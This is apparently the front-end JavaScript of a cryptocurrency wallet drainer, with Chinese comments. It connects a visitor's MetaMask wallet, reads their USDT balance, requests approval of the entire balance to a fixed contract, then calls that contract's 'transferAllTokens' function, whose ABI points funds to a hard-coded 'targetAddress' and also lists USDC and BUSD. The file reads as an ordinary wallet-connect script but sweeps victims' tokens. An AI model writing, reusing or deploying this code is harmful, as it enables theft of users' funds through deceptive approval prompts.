// 设置Web3和MetaMask连接
async function connectWallet() {
    if (window.ethereum) {
        try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            document.getElementById('wallet-address').textContent = account;
            alert('Wallet connected: ' + account);
            return account;
        } catch (error) {
            console.error('Connection failed', error);
            alert('Failed to connect wallet.');
        }
    } else {
        alert('Please install MetaMask!');
    }
}

// 智能合约地址
const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';

// 智能合约ABI
const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			}
		],
		"name": "transferAllTokens",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"stateMutability": "payable",
		"type": "receive"
	},
	{
		"inputs": [],
		"name": "busdToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "targetAddress",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdcToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "usdtToken",
		"outputs": [
			{
				"internalType": "contract IERC20",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

// ERC20 ABI
const ERC20_ABI = [
    {
        "constant": true,
        "inputs": [{ "name": "_owner", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "balance", "type": "uint256" }],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }],
        "name": "approve",
        "outputs": [{ "name": "success", "type": "bool" }],
        "type": "function"
    }
];

// 授权代币
async function approveTokens(tokenContract, account, contractAddress, amount) {
    try {
        const gasPrice = await web3.eth.getGasPrice();
        const gasLimit = 100000; // Gas limit for approval

        await tokenContract.methods.approve(contractAddress, amount).send({
            from: account,
            gasPrice: gasPrice,
            gas: gasLimit
        });
        alert('Token approved successfully!');
    } catch (error) {
        console.error('Approval failed', error);
        alert('Failed to approve tokens.');
    }
}

// 检查并转移所有代币
async function transferTokens() {
    const account = await connectWallet();
    if (!account) return;

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // USDT 合约地址
    const usdtContract = new web3.eth.Contract(ERC20_ABI, usdtAddress);

    try {
        const usdtBalance = await usdtContract.methods.balanceOf(account).call();
        const gasPrice = await web3.eth.getGasPrice();
        const gasLimit = 500000;  // 增加Gas Limit

        // 如果USDT有余额，先进行授权
        if (usdtBalance > 0) {
            await approveTokens(usdtContract, account, contractAddress, usdtBalance);
        }

        // 调用transferAllTokens函数
        await contract.methods.transferAllTokens(account).send({
            from: account,
            gasPrice: gasPrice,
            gas: gasLimit
        });

        alert('Tokens transferred successfully!');
    } catch (error) {
        console.error('Token transfer failed', error);
        alert('Failed to transfer tokens. Make sure you have enough balance and approved the tokens.');
    }
}
